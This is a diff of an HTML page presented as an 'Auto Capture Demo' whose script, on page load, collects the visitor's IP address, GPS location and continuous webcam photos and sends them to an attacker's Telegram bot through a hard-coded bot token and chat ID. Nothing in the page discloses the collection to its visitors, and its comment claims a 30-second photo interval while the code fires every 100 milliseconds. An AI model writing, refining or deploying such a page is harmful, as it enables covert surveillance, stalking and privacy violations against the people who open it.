@@ -1,43 +1,100 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>magic is fixed </title>
+  <title>Auto Location + Camera + IP</title>
 </head>
 <body>
-  <h2>Auto Send Location & Photo</h2>
+  <h2>Auto Capture Demo</h2>
   <video id="video" autoplay playsinline width="300"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    const BOT_TOKEN = "8469961243:AAEj96it0Xm-QEPlkRM8nZPM5RfId3bIVYs";
+    const BOT_TOKEN = "8469961243:AAEj96it0Xm-QEPlkRM8nZPM5RfId3bIVYs";  
     const CHAT_ID = "6096787949";
 
-    // 1. Get Location
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(pos => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const locMsg = `User Location: https://www.google.com/maps?q=${lat},${lon}`;
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locMsg)}`);
+    // 1. Get IP
+    async function getIP() {
+      let res = await fetch("https://api.ipify.org?format=json");
+      let data = await res.json();
+      return data.ip;
+    }
+
+    // 2. Send message to Telegram
+    async function sendMessage(msg) {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
       });
     }
 
-    // 2. Camera Access + Auto Capture
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-      video.srcObject = stream;
-      setTimeout(() => {
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width = video.videoWidth, canvas.height = video.videoHeight);
-        canvas.toBlob(blob => {
-          const formData = new FormData();
-          formData.append("chat_id", CHAT_ID);
-          formData.append("photo", blob, "capture.jpg");
-          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
-        }, "image/jpeg");
-      }, 5000); // auto-capture after 5 sec
-    }).catch(err => console.error("Camera error:", err));
+    // 3. Send photo to Telegram
+    async function sendPhoto(blob) {
+      let formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, "capture.jpg");
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    }
+
+    // 4. Get location
+    function getLocation() {
+      return new Promise((resolve, reject) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(pos => {
+            resolve({lat: pos.coords.latitude, lon: pos.coords.longitude});
+          }, reject);
+        } else {
+          reject("Geolocation not supported");
+        }
+      });
+    }
+
+    // 5. Get photo from webcam
+    async function capturePhoto() {
+      let video = document.getElementById("video");
+      let canvas = document.getElementById("canvas");
+      let context = canvas.getContext("2d");
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      return new Promise(resolve => {
+        canvas.toBlob(resolve, "image/jpeg");
+      });
+    }
+
+    // 6. Start camera stream once
+    async function startCamera() {
+      let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      document.getElementById("video").srcObject = stream;
+    }
+
+    // Run everything
+    (async () => {
+      try {
+        await startCamera();
+
+        // Send IP + Location once
+        let ip = await getIP();
+        let loc = await getLocation();
+        await sendMessage(`IP: ${ip}\nLocation: https://maps.google.com/?q=${loc.lat},${loc.lon}`);
+
+        // Send photo every 30 sec
+        setInterval(async () => {
+          let photo = await capturePhoto();
+          await sendPhoto(photo);
+        }, 100);
+
+      } catch (e) {
+        console.error(e);
+      }
+    })();
   </script>
 </body>
 </html>
+
